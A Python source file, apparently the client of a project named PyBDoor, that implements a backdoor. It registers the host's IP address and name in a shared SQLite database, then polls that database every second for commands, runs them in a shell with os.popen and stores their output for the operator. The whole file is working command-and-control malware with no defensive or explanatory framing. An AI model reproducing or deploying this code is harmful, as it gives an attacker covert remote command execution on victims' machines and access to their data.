import sqlite3,socket,os,time,datetime

class backdoor:
    def __init__(self):
        self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
        self.cursor = self.db.cursor()

        pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
        self.pc_id = None
        for pc in pcs:
            if socket.gethostbyname(socket.gethostname()) == pc[1]:
                self.pc_id = pc[0]

        if self.pc_id == None:
            sql_code = """INSERT INTO backdoor_computer
                      (ip_addr, pc_name)
                      VALUES (?, ?)
            """
            
            self.cursor.execute(sql_code, (socket.gethostbyname(socket.gethostname()),socket.gethostname()))
            self.db.commit()

            pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
            self.pc_id = None
            for pc in pcs:
                if socket.gethostbyname(socket.gethostname()) == pc[1]:
                    self.pc_id = pc[0]

        while True:
            self.command_thread()
            time.sleep(1)
    
    def command_thread(self):
        commands = self.cursor.execute("SELECT * FROM backdoor_command").fetchall()
        for command in commands:
            if command[2] == self.pc_id:
                output = os.popen(command[1]).read()
                self.cursor.execute(f"DELETE FROM backdoor_command WHERE id={str(command[0])}")
                sql_code = """INSERT INTO backdoor_output
                      (command, output, target_id, time)                 
                      VALUES (?, ?, ?, ?)
                """
                self.cursor.execute(sql_code, (command[1], output, self.pc_id,datetime.datetime.now()))
                self.db.commit()
                
backdoor()